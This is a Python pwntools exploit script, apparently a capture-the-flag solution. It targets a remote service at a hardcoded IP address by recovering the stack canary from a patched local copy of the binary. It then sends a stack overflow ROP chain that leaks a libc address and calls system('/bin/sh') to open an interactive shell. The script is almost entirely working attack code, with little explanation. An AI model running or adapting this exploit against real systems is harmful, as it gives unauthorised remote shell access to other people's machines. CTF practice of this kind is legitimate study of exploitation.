from pwn import *
import time
import sys

def twisted(DEBUG):
	t = 0.3
	offset_system = 0x3a940
	offset_sh = 0x15902b
	offset_printf = 0x49020
	HOST = '34.218.199.37'
	PORT = 6000
	r1 = process("./twisted_patched", env={"LD_PRELOAD":"./libc.so.6"})
	r2 = remote(HOST,PORT)
	
	
	for i in xrange(312):
		question1 = r1.recvuntil("\n").split("=")[0]
		question2 = r2.recvuntil("\n").split("=")[0]
		if question1!=question2:
			print "Fail"
			return
		answer  = eval(question1)
		r1.sendline(str(answer))
		r2.sendline(str(answer))
	
	fgets_buff = 0x08048979
	puts_plt = 0x080484E0
	printf_got = 0x804a00c
	bss = 0x804b000-0x100
	r1.recvuntil("Bot Verification Complete!\n")
	r2.recvuntil("Bot Verification Complete!\n")
	r2.recvuntil("Enter your message below :\n")
	canary = u32(r1.recv(4)) # patched local binary -> puts(canary)
	"""
	.text:08048961                 push    offset dword_804AA28 ; Keypatch modified this from:
	.text:08048961                                         ;   push offset aEnterYourMessa
	.text:08048966                 call    _puts
	"""
	log.info('canary: %#x' % canary)
	r2.send("1")
	payload = "A"*0x10
	payload += p32(canary)
	payload += p32(bss) # ebp
	payload += p32(puts_plt)
	payload += p32(fgets_buff)
	payload += p32(printf_got)
	raw_input("?")
	r2.sendline(payload)
	printf = u32(r2.recv(4))
	baselibc = printf - offset_printf
	system = baselibc + offset_system
	sh = baselibc + offset_sh
	log.info('libc: %#x' % baselibc)
	log.info('system: %#x' % system)
	log.info('sh: %#x' % sh)
	log.info('printf: %#x' % printf)
	
	payload = "A"*0x10
	payload += p32(canary)
	payload += p32(bss) # ebp
	payload += p32(system)
	payload += p32(fgets_buff)
	payload += p32(sh)
	raw_input("?")
	r2.sendline(payload)
	r2.interactive() 
	
twisted(sys.argv[1])